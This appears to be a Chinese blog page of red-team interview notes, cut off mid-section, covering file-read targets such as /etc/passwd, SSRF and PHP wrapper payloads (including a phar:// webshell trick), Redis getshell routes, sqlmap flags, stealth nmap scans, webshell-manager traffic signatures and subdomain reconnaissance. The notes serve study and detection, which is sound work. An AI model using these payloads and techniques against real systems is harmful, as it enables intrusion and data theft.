<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HW面试 | J1Nmu</title><meta name="author" content="Jinmu"><meta name="copyright" content="Jinmu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HW面试 OSI 的七层模型都有哪些？ https:&amp;#x2F;&amp;#x2F;blog.csdn.net&amp;#x2F;qq_39521554&amp;#x2F;article&amp;#x2F;details&amp;#x2F;79894501 任意文件读取，我们通常获取什么文件 &amp;#x2F;etc&amp;#x2F;passwd	系统用户配置文件，存储了系统中所有用户的基本信息 &amp;#x2F;index.php &amp;#x2F;conf"><link rel="shortcut icon" href="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg"><link rel="canonical" href="https://jinmu1108.github.io/%E9%9D%A2%E8%AF%95/HW%E9%9D%A2%E8%AF%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HW面试',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-04-17 16:22:58'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">54</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">J1Nmu</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HW面试</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-17T11:20:30.291Z" title="发表于 2023-04-17 19:20:30">2023-04-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-17T08:22:58.961Z" title="更新于 2023-04-17 16:22:58">2023-04-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%A2%E8%AF%95/">面试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">20.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>71分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HW面试"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>HW面试</h1>
<h2 id="OSI-的七层模型都有哪些？">OSI 的七层模型都有哪些？</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39521554/article/details/79894501">https://blog.csdn.net/qq_39521554/article/details/79894501</a></p>
<h2 id="任意文件读取，我们通常获取什么文件">任意文件读取，我们通常获取什么文件</h2>
<p>/etc/passwd	系统用户配置文件，存储了系统中所有用户的基本信息</p>
<p>/index.php</p>
<p>/config.ini</p>
<p>nignx默认日志<code>/var/log/nignx/access.log</code></p>
<p>apache默认日志<code>/var/log/nignx/access.log</code></p>
<h2 id="ssrf使用了什么协议">ssrf使用了什么协议</h2>
<p>gopher协议,file协议,dict协议</p>
<p>gopher协议通常是用脚本来编写的</p>
<p>file协议访问文件绝对路径</p>
<p><strong>dict协议功能：</strong></p>
<p>探测内网主机</p>
<p>探测端口的开放情况和指纹信息</p>
<p>执行命令</p>
<h2 id="PHP文件包含使用了什么协议">PHP文件包含使用了什么协议</h2>
<ul>
<li>
<h3 id="php-filter（本地磁盘文件进行读取）">php://filter（本地磁盘文件进行读取）</h3>
</li>
</ul>
<p>只是读取，需要开启allow_url_fopen,不需要开启allow_url_include;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure>
<ul>
<li>
<h3 id="php-input访问请求的原始数据的只读流-直接读取到POST上没有经过解析的原始数据。">php://input	访问请求的原始数据的只读流,直接读取到POST上没有经过解析的原始数据。</h3>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://input</span><br><span class="line">[POST data]</span><br></pre></td></tr></table></figure>
<ul>
<li>
<h3 id="file-通过file伪协议可以访问本地文件系统，读取到文件的内容">file://	通过file伪协议可以访问本地文件系统，读取到文件的内容</h3>
</li>
</ul>
<p>不受allow_url_fopen与allow_url_include的影响</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure>
<ul>
<li>
<h3 id="data">data://</h3>
</li>
</ul>
<p>注意浏览器不能识别<code>+</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;[编码类型],&lt;?php phpinfo();?&gt;</span><br><span class="line">						[对应的编码形式的字符]</span><br></pre></td></tr></table></figure>
<ul>
<li>
<h3 id="phar-php解压缩的一个函数，不管后缀是什么，都会当做压缩包来解压">phar://	php解压缩的一个函数，不管后缀是什么，都会当做压缩包来解压</h3>
</li>
</ul>
<p>注意 PHP&gt;=5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。</p>
<p>步骤：写一个一句话木马shell.php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://压缩包/内部文件</span><br><span class="line">?file=phar://xxx.png/shell.php</span><br></pre></td></tr></table></figure>
<ul>
<li>dict://	探测内网主机,探测端口的开放情况和指纹信息,执行命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:8000</span><br></pre></td></tr></table></figure>
<p>用dict协议请求内网端口查看是否存活</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/6f4e05e4dfbd49a6ab01949ea3380cb4.png" alt="在这里插入图片描述"></p>
<ul>
<li>
<h3 id="zlib-—-压缩流"><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> — 压缩流</h3>
</li>
<li>
<h3 id="ftp-—-访问-FTP-s-URLs"><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URLs</h3>
</li>
</ul>
<h2 id="各种数据库的区别">各种数据库的区别</h2>
<p><strong>关系型数据库：</strong></p>
<ul>
<li><strong>MYSQL       3306</strong></li>
<li><strong>SQL Server    1433</strong></li>
<li><strong>Oracle        1521</strong></li>
<li><strong>DB2          5000</strong></li>
</ul>
<p><strong>非关系型数据库：</strong></p>
<ul>
<li><strong>Redis          6379</strong></li>
<li><strong>Memcached    11211</strong></li>
<li><strong>MongoDB      27017</strong></li>
<li><strong>HBase</strong>       列存储数据库</li>
</ul>
<p><strong>区别</strong></p>
<p>关系型数据库最典型的数据结构是表，由二维表及其之间的联系所组成的一个数据组织</p>
<p>非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合，可以是文档或者键值对等。</p>
<p>比如</p>
<p><strong>Redis</strong>		<strong>键值数据库</strong></p>
<p><strong>MongoDB</strong>		<strong>文档数据库</strong></p>
<p><strong>HBase</strong>       <strong>列存储数据库</strong></p>
<p><strong>Neo4J</strong> 	 <strong>（非关系型数据库----图形数据库）</strong></p>
<p>数据库模型：对象模型、层次模型（轻量级数据访问协议）、网状模型（大型数据储存）、关系模型、面向对象模型、半结构化模型、平面模型（表格模型，一般在形式上是一个二维数组。如表格模型数据Excel)</p>
<h2 id="Redis-getshell的过程">Redis getshell的过程</h2>
<p>绝对路径写shell，将shell写在web目录下</p>
<p>redis公钥导入</p>
<p>利用定时任务进行反弹shell(centos)</p>
<p>redis 主从复制getshell</p>
<h2 id="sqlmap怎么看当前用户权限">sqlmap怎么看当前用户权限</h2>
<pre><code>Enumeration:

-a, --all 查找全部，很暴力。直接用-a
-b, --banner 查找数据库管理系统的标识。直接用-b
--current-user 当前用户，常用，直接用--current-user
--current-db 当前数据库，常用，直接用--current-db
--hostname 主机名，直接用--hostname
--is-dba
--users 查询一共都有哪些用户，常用，直接用--users
--passwords 查询用户密码的哈希，常用，直接用--passwords
--privileges 查看特权，常用。例： --privileges -U username (CU 就是当前用户)
--roles 查看一共有哪些角色（权限），直接用--roles
--dbs 目标服务器中有什么数据库，常用，直接用--dbs
--tables 目标数据库有什么表，常用，直接用--tables
--columns 目标表中有什么列，常用，直接用--colums
--schema 目标数据库数据库系统管理模式。
--count 查询结果返回一个数字，即多少个。
--dump 查询指定范围的全部数据。例： --dump -D admin -T admin -C username
--dump-all 查询全部数据。例： --dump-all --exclude-sysdbs
--search 搜索列、表和/或数据库名称。
--comments 检索数据库的备注。
-D DB 指定从某个数据库查询数据，常用。例： -D admindb
-T TBL 指定从某个表查询数据，常用。例： -T admintable
-C COL 指定从某个列查询数据，常用。例： -C username
-X EXCLUDE 指定数据库的标识符。
-U USER 一个用户，通常和其他连用。例： --privileges -U username (CU 就是当前用户)
--exclude-sysdbs 除了系统数据库。
--pivot-column=P.. 枢轴列名，不懂。
--where=DUMPWHERE 在dump表时使用where限制条件。
--start=LIMITSTART 设置一个起始，通常和--dunmp连用。
--stop=LIMITSTOP 同上，设置一个结束。
--first=FIRSTCHAR 以第一个查询输出的字符检索，不懂。
--last=LASTCHAR 以最后一个查询输出的字符检索，不懂+2。
--sql-query=QUERY 执行一个sql语句。
--sql-shell 创建一个sql的shell。
--sql-file=SQLFILE 执行一个给定文件中的sql语句
</code></pre>
<h2 id="sqlmap-os-shell-后台执行了什么操作">sqlmap --os-shell 后台执行了什么操作</h2>
<p>sqlmap --os-shell,就是上传了两个php文件,一个上传一个tmpugvzq.php可以让我们上传文件到网站路径下,然后sqlmap这个php上传一个用于命令执行的tmpbylqf.php到网站路径下，让我们命令执行</p>
<ul>
<li>利用条件</li>
</ul>
<p>secure_file_priv无限制—转义一些特殊字符</p>
<p>网站路径有写入权限</p>
<p>高权限数据库用户</p>
<p>知道网站的物理路径</p>
<h2 id="nmap怎么隐藏ip扫描">nmap怎么隐藏ip扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sN;-sF;-sX 【目标】 隐蔽扫描</span><br></pre></td></tr></table></figure>
<h2 id="挖过SRC吗">挖过SRC吗?</h2>
<p>有尝试过,不过没成功.</p>
<h2 id="用过哪些安全设备">用过哪些安全设备</h2>
<p>waf,宝塔,微步云沙箱,D盾</p>
<p>用过比特梵得,卡巴斯基,火绒,360杀毒,金山毒霸</p>
<h2 id="Webshell管理工具的流量特征">Webshell管理工具的流量特征</h2>
<h3 id="菜刀">菜刀</h3>
<p>菜刀默认使用了base64编码,使用eval(有少数时候eval方法会被assert方法替代)</p>
<p>shell特征:默认传输参数名<code>z0</code>,还存在<code>int_set(&quot;display_erros&quot;,&quot;0&quot;)</code>字符串特征</p>
<h3 id="蚁剑">蚁剑</h3>
<p>由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“<strong>_0x</strong>…=”这种形式（下划线可替换为其他）所以，以**_0x开头的参数名**,也是一种特征</p>
<p>默认的蚁剑shell,连接时会请求两次,请求只是经过url编码</p>
<p>第一次请求,关闭保存和magic_quotes,接下来去获取主机的信息</p>
<p>第二次请求,会把主机目录列出来</p>
<p>magic_quotes中的常见设置会将一些特殊字符转义</p>
<h3 id="冰蝎">冰蝎</h3>
<p><strong>冰蝎强特征：content-type为application/octet-stream</strong></p>
<h4 id="冰蝎2-0">冰蝎2.0</h4>
<p>使用AES加密发起三次请求</p>
<p>第一次请求服务端产生密钥写入session,session和当前会话绑定不同的客户</p>
<p>第二次请求是为了获取key</p>
<p>第三次使用key和AES加密进行通信</p>
<h4 id="冰蝎3-0">冰蝎3.0</h4>
<p>使用AES加密发起请求</p>
<p>3.0比2.0少了动态密钥的获取请求,不在使用随机生成的key,改为取连接密码的md5加密值的前16位作为密钥</p>
<p>第一次请求为判断是否可以建立连接,少了两次get获取冰蝎动态密钥的行为</p>
<p>第二次发送phpinfo等代码执行,获取网站信息</p>
<h4 id="冰蝎4-0">冰蝎4.0</h4>
<p>4.0提供了<code>传输协议自定义</code>功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。4.0不再有连接密码的概念，你的自定义传输协议的算法就是连接密码</p>
<h5 id="Content-Type">Content-Type</h5>
<p><code>Content-type: Application/x-www-form-urlencoded</code></p>
<h5 id="User-agent-字段">User-agent 字段</h5>
<p>冰蝎设置了10种User-Agent,每次连接shell时会随机选择一个进行使用。</p>
<h5 id="端口">端口</h5>
<p>冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加。</p>
<h5 id="HP-webshell-中存在固定代码">HP webshell  中存在固定代码</h5>
<p>$post=Decrypt(file_get_contents(“php://input”));</p>
<p>eval($post);</p>
<h5 id="长连接">长连接</h5>
<p>默认情况下，请求头和响应头里会带有 Connection。</p>
<p>Connection: Keep-Alive</p>
<h5 id="固定的请求头和响应头">固定的请求头和响应头</h5>
<p>请求字节头：</p>
<p>dFAXQV1LORcHRQtLRlwMAhwFTAg/M</p>
<h5 id="连接密码">连接密码</h5>
<p>默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥。该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</p>
<p>支持二进制服务端，服务端不再依赖web。</p>
<p>新增平行世界模块，可对目标内网资产进行管理；</p>
<p>新增主机扫描、端口扫描、服务识别模块；<br>
新增支持Java9~java15+版本Agent内存马一键注入；<br>
新增支持Java Agent无文件落地注入内存马；<br>
新增多层网络子Shell穿透模块，实现多层”蝎中蝎”；</p>
<h2 id="渗透测试流程">渗透测试流程</h2>
<p><strong>明确目标：<strong>主要是确定需要</strong>渗透资产范围</strong>；确定规则，如怎么去渗透；确定需求，如客户需要达到一个什么样的效果。</p>
<p><strong>信息收集：<strong>信息收集阶段主要是收集一些基础信息，<strong>系统信息</strong>，<strong>应用信息</strong>，<strong>版本信息</strong>，<strong>服务信息</strong>，<strong>人员信息</strong>以及</strong>相关防护信息</strong>。信息收集大多是工具加手工进行收集信息，工具如 nmap，相关终端命令，浏览器插件，在线工具等。</p>
<p><strong>漏洞探测（挖掘）：<strong>主要是</strong>探测（挖掘）系统漏洞</strong>，<strong>web 服务器漏洞</strong>，<strong>web 应用漏洞</strong>以及<strong>其他端口服务漏洞</strong>，如 telnet，ssh，vnc，远程桌面连接服务（3389）等。</p>
<p>漏洞验证（利用）：漏洞验证主要是利用探测到的漏洞进行攻击，方法主要有自动化验证（msf），手工验证，业务漏洞验证，公开资源的验证等。总的来说就是工具加手工，为了方便，可以将自己渗透常使用的工具进行封装为工具包。</p>
<p>**提升权限：**提升权限主要是在当前用户权限不是管理员的时候需要进行提升权限，提升权限可以是提升系统权限，web 应用权限或是数据库权限等。</p>
<p>**清除痕迹：**清楚痕迹主要是清除渗透过程中操作的一些痕迹，如添加的测试账号，上传的测试文件,  powershell命令的历史记录等。</p>
<p><strong>事后信息分析</strong>：主要是对整个渗透过程进行信息分析与整理，分析脆弱环节，技术防护情况以及管理方面的情况进行一个现状分析以及提出相关建议。</p>
<p><strong>编写渗透测试报告</strong>：根据渗透测试具体情况编写渗透测试报告，渗透测试报告必须简洁明了，说清楚渗透清单（范围），攻击路径，渗透成果，以及详细的漏洞详情（相关描述、漏洞危害等）及可行的修复建议，最后对整改渗透情况进行简单的总结和分析，说清楚目前资产的一个状况是什么样的，应该从哪些方面进行加强和提升。</p>
<h2 id="边缘资产如何探测">边缘资产如何探测</h2>
<p>从主域名出发,我们首先需要考虑的是子域名,<a target="_blank" rel="noopener" href="http://xn--xxx-4l3e.com">即xxx.com</a>,</p>
<h3 id="子域名收集">子域名收集</h3>
<h4 id="搜索引擎查询">搜索引擎查询</h4>
<p>谷歌黑暗搜索:</p>
<blockquote>
<p>- site:domain.com filetype:xls|doc|pdf</p>
<p>- site:domain.com inurl:admin|login|manage</p>
<p>- site:domain.com intitle:管理|后台|登录</p>
<p>- site:domain.com intext:登录|后台、管理|error|debug</p>
<p>inturl:</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网络空间安全搜索引擎</span><br><span class="line">zoomeye(钟馗之眼)：https://www.zoomeye.org</span><br><span class="line">shodan：https://www.shodan.io</span><br><span class="line">Fofa：https://fofa.so</span><br><span class="line"> </span><br><span class="line">PS：可编写Python脚本批量查询、获取</span><br></pre></td></tr></table></figure>
<h4 id="在线查询接口">在线查询接口</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://tool.chinaz.com/subdomain/</span><br><span class="line">http://i.links.cn/subdomain/    </span><br><span class="line">http://subdomain.chaxun.la/</span><br><span class="line">http://searchdns.netcraft.com/</span><br><span class="line">https://www.virustotal.com/</span><br><span class="line">https://censys.io/</span><br><span class="line">https://x.threatbook.cn/ 微步在线</span><br></pre></td></tr></table></figure>
<h4 id="子域名暴力猜解">子域名暴力猜解</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爆破工具：</span><br><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https://github.com/ring04h/wydomain    </span><br><span class="line">subDomainsBrute:https://github.com/lijiejie/</span><br><span class="line">Sublist3r:https://github.com/aboul3la/Sublist3r</span><br></pre></td></tr></table></figure>
<h4 id="DNS查询-枚举">DNS查询/枚举</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DNS查询：</span><br><span class="line">host -t a domainName</span><br><span class="line">host -t mx domainName</span><br><span class="line"> </span><br><span class="line">优点：非常直观，通过查询DNS服务器的A记录、CNAME等，可以准确得到相关信息，较全。</span><br><span class="line">缺点：有很大的局限性，很多DNS是禁止查询的。</span><br><span class="line">参考：https://www.cnblogs.com/xuanhun/p/3489038.html</span><br><span class="line"> </span><br><span class="line">域传送漏洞</span><br><span class="line"> </span><br><span class="line">DNS暴力破解：fierce</span><br><span class="line">参考链接：http://blog.csdn.net/jeanphorn/article/details/44987549</span><br><span class="line"> </span><br><span class="line">Passive DNS</span><br><span class="line">参考链接：http://www.freebuf.com/articles/network/103815.html</span><br></pre></td></tr></table></figure>
<h4 id="HTTPS证书">HTTPS证书</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中。SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。</span><br><span class="line"> </span><br><span class="line">SSL证书搜索引擎：</span><br><span class="line">https://certdb.com/domain/github.com</span><br><span class="line">https://crt.sh/?Identity=%%.github.com</span><br><span class="line">https://censys.io/</span><br><span class="line"> </span><br><span class="line">基于 HTTPS 证书的子域名收集小程序 ：GetDomainsBySSL.py</span><br><span class="line">参考链接：http://www.freebuf.com/articles/network/140738.html</span><br></pre></td></tr></table></figure>
<h4 id="综合搜索">综合搜索</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">提莫：https://github.com/bit4woo/teemo </span><br><span class="line">主要有三大模块：搜索引擎 第三方站点 枚举 </span><br><span class="line"> </span><br><span class="line">利用全网IP扫描http端口 在访问IP的80或者8080端口的时候，可能会遇到配置了301跳转的，可以在header里获取域名信息。</span><br><span class="line">全网扫描结果如下：https://scans.io/study/sonar.http</span><br></pre></td></tr></table></figure>
<h4 id="子域名筛选">子域名筛选</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当收集的子域名数量过大，手动筛选工作量太大，如何快速扫描，半自动的筛选出有效的可能存在漏洞的子域名。</span><br><span class="line">参考链接：http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/3413.html</span><br></pre></td></tr></table></figure>
<h4 id="相关域名收集">相关域名收集</h4>
<h5 id="旁站及c段收集">旁站及c段收集</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">同IP网站及C段查询</span><br><span class="line">IP反查域名</span><br><span class="line"> </span><br><span class="line">工具：御剑、K8现在还是dirmap好用</span><br><span class="line">在线查询工具：</span><br><span class="line">http://www.hackmall.cn/</span><br><span class="line">http://www.webscan.cc/  推荐</span><br><span class="line">https://phpinfo.me/bing.php </span><br><span class="line"> </span><br><span class="line">将C段收集的相关IP，推测该单位所在的IP段，再针对IP段进行服务器端口扫描</span><br></pre></td></tr></table></figure>
<h5 id="端口扫描">端口扫描</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对1-65535端口扫描，探测Web服务端口</span><br></pre></td></tr></table></figure>
<h5 id="主站提取">主站提取</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过编写爬虫,从主站页面(一般在主页)获取相关业务系统</span><br><span class="line"></span><br><span class="line">跨域策略文件 crossdomain.xml</span><br><span class="line">如：https://www.baidu.com/crossdomain.xml</span><br></pre></td></tr></table></figure>
<h5 id="移动端">移动端</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">随着移动端的兴起，很多单位都有自己的移动APP、微信公众号、支付宝生活号等，这也是值得重点关注的点。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="行业系统">行业系统</h5>
